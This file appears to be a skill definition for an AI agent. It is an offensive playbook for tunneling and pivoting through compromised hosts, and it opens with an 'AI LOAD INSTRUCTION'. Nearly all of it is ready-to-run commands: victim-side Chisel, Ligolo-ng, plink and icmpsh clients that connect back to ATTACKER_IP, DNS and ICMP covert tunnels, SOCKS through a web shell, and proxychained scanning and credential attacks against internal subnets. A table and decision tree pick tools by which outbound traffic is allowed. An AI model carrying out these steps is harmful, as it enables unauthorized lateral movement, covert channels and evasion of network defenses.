---
name: tunneling-and-pivoting
description: >-
  Tunneling and pivoting playbook. Use when establishing network tunnels through compromised hosts including SSH tunneling, Chisel, Ligolo-ng, socat, DNS/ICMP/HTTP tunneling, ProxyChains, and multi-layer pivoting strategies.
---

# SKILL: Tunneling & Pivoting

> **AI LOAD INSTRUCTION**: Expert tunneling and pivoting techniques. Covers SSH port forwarding (local/remote/dynamic/jump), Chisel reverse SOCKS, Ligolo-ng transparent TUN pivoting, socat relays, DNS/ICMP/HTTP tunneling, ProxyChains, Windows pivoting (netsh/plink), and multi-layer chaining.

## 0. RELATED ROUTING

- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for initial access
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for services discovered through pivots

---

## 1. SSH TUNNELING

```bash
# Local port forward: access INTERNAL:3306 via localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 user@PIVOT -N

# Remote port forward: expose attacker's listener to pivot network
ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@PIVOT -N

# Dynamic SOCKS proxy
ssh -D 1080 user@PIVOT -N
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 80,443,445 INTERNAL_SUBNET/24

# Jump host
ssh -J jumphost user@TARGET
ssh -J jump1,jump2 user@TARGET
```

---

## 2. CHISEL

```bash
# Reverse SOCKS proxy
# Attacker:
chisel server --reverse --port 8080
# Victim:
chisel client ATTACKER_IP:8080 R:socks
# Result: SOCKS5 on attacker's 127.0.0.1:1080

# Port forward
chisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306
chisel client ATTACKER:8080 R:3306:DB:3306 R:8080:WEB:80
```

---

## 3. LIGOLO-NG (transparent TUN routing)

```bash
# Attacker setup:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Agent (victim):
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# Proxy console:
>> session
>> ifconfig
>> start

# Add routes:
sudo ip route add 10.10.10.0/24 dev ligolo

# Listener for reverse shells:
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

---

## 4. SOCAT

```bash
# TCP port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:INTERNAL_DNS:53

# Encrypted tunnel
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL:80
```

---

## 5. PROXYCHAINS

```ini
# /etc/proxychains4.conf
strict_chain
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p pass
```

---

## 6. WINDOWS PIVOTING

```cmd
:: Netsh port forward (admin required)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL
netsh interface portproxy show all

:: Plink (PuTTY CLI)
plink.exe -ssh -D 1080 -N user@ATTACKER
plink.exe -ssh -R 4444:127.0.0.1:4444 user@ATTACKER
echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER
```

---

## 7. DNS TUNNELING

```bash
# iodine: IP-over-DNS
# Server: iodined -f -c -P password 10.0.0.1 t1.yourdomain.com
# Client: iodine -f -P password t1.yourdomain.com

# dnscat2:
# Server: ruby dnscat2.rb yourdomain.com
# Client: ./dnscat --dns=server=ATTACKER,port=53 --secret=SHARED_SECRET
```

---

## 8. ICMP TUNNELING

```bash
# icmpsh
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP VICTIM_IP
# victim: icmpsh.exe -t ATTACKER_IP

# ptunnel-ng TCP-over-ICMP
# Server: ptunnel-ng -r INTERNAL_HOST -R 22
# Client: ptunnel-ng -p PIVOT_IP -l 2222 -r INTERNAL_HOST -R 22
ssh -p 2222 user@127.0.0.1
```

---

## 9. HTTP TUNNELING

```bash
# Neo-reGeorg (SOCKS via web shell)
python3 neoreg.py generate -k PASSWORD   # generate tunnel.php/aspx/jsp
python3 neoreg.py -k PASSWORD -u http://TARGET/tunnel.php
# SOCKS proxy on 127.0.0.1:1080
```

---

## 10. EGRESS-AWARE TOOL SELECTION

| Egress Allowed | Tool |
|---|---|
| TCP outbound (any port) | Chisel, Ligolo-ng, SSH |
| TCP 80/443 only | Chisel (HTTPS), Neo-reGeorg |
| DNS only (53/udp) | iodine, dnscat2 |
| ICMP only | ptunnel-ng, icmpsh |
| No outbound | Bind shell + port forward in |
| Web shell only | Neo-reGeorg, Tunna |

---

## 11. DECISION TREE

```
Need to reach internal network?
|
|-- Can install tools + TCP outbound?
|   |-- Transparent routing needed? -> Ligolo-ng
|   |-- SOCKS proxy needed? -> Chisel reverse SOCKS
|   |-- SSH available? -> ssh -D dynamic forward
|
|-- Only HTTP(S) outbound?
|   |-- Chisel over HTTPS or Neo-reGeorg web tunnel
|
|-- Only DNS outbound? -> iodine / dnscat2
|-- Only ICMP? -> ptunnel-ng / icmpsh
|-- Web shell only? -> Neo-reGeorg
|
|-- Windows pivot?
|   |-- Admin? -> netsh portproxy
|   |-- Outbound SSH? -> plink
|
|-- Multi-layer pivot?
|   |-- Ligolo-ng: multiple agents + route stacking
|   |-- SSH ProxyJump chaining
|   |-- ProxyChains with multiple SOCKS entries
```
